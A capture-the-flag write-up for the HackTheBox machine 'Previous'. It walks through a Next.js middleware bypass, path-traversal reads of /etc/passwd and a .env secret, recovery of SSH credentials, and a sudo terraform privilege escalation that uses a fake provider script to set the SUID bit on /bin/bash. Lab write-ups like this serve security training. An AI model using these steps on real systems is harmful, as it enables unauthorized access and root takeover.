# Previous: HackTheBox

Difficulty: Medium (I'd say this was pretty easy).

---

## Enumeration

port 22,80 open with port 80 having hostname http://previous.htb/

/docs endpoint is vulnerable to [this exploit](https://github.com/MuhammadWaseem29/CVE-2025-29927-POC?tab=readme-ov-file#proof-of-concept-steps).

I used burpsuite's match and replace rules to add in the new exploit header. To do this, simply go to proxy settings and go to match and replace. Then add a new rule, and leave the match section blank. Place the exploit header in the replace section, and you should be able to get the exploit going.

Now I found an LFI in the /api/download?example=<filename> endpoint, by sending `../../../../../etc/passwd` I was able to recover this:
```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```
This is actually the docker container path so this doesn't contain any real users on the host system.

Environment variables from ../../../app/.env (I found the location of the app by reading /proc/self/environ)
```
NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```

There are also useless lol.

Through a lot of ChatGPT, found this page  `../../../../app/.next/server/pages/api/auth/[...nextauth].js` which reveals some credentials.

Credentials: `jeremy:MyNameIsJeremyAndILovePancakes`

This gives us ssh access and user flag.

## Privilege Escalation

Running `sudo -l` gives this:

```bash
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

<!-- Got the PE Vector from [this article](https://medium.com/@toshithh/proof-of-concept-terraform-privilege-escalation-cd3db69df90e). Ok this is literally the fucking writeup for this machine's PE lol, I didnt even notice until I read the whole thing. Luckily I didnt understand what he did here lol so I will explain what I did -->

See [this article](https://dollarboysushil.com/posts/Terraform-Sudo-Exploit-Privilege-Escalation/) to avoid spoilers.

So I changed up the exploit a little here so let me walk you through the steps:

1. First do 

```bash
cat /opt/examples/*.tf
```
This gives the provider name. (honestly it doesnt matter here)

2. In the /tmp directory, make a directory called privesc.
3. Run this:

```bash
cat > /tmp/privesc/terraform-provider-examples << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
```
4. Run this too

```bash
chmod +x /tmp/privesc/terraform-provider-examples
```
5. Run this again lol:

```bash
cat > /tmp/privesc/dollarboysushil.rc << 'EOF'
provider_installation {
  dev_overrides {
    "dollarboysushil.com/terraform/examples" = "/tmp/privesc"
  }
  direct {}
}
EOF
```

6. Run `export TF_CLI_CONFIG_FILE=/tmp/privesc/dollarboysushil.rc`

7. cd to `/opt/examples`

8. `sudo /usr/bin/terraform -chdir=/opt/examples apply`

9. `/bin/bash -p`

You should have a root shell.
